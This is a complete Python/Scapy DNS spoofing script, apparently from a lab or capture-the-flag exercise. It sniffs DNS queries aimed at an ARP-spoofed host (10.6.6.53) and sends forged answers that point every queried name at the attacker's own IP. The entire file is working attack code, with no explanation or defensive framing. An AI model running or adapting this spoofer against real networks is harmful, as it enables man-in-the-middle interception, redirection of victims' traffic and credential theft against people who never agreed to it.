#!/usr/bin/python3
from scapy.all import *
import netifaces as ni

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ni.ifaddresses('eth0')[ni.AF_LINK][0]['addr']
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"

def handle_dns_request(packet):
    # Craft DNS answer and send it
    packet.show()
    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    ip  = IP(dst=packet[IP].src, src=packet[IP].dst)           
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)   
    dns = DNS(
        id=packet[DNS].id, qr=1, aa=1, rd=1, ra=1, qdcount=1, ancount=1,
        qd=packet[DNS].qd,
        an=DNSRR(
            rrname=packet[DNSQR].qname, 
            rdata=ipaddr,
            ttl=60
        )
    )
    dns_response = eth / ip / udp / dns
    dns_response.show()
    sendp(dns_response, iface="eth0")
    
def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )
    
    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
    
if __name__ == "__main__":
    main()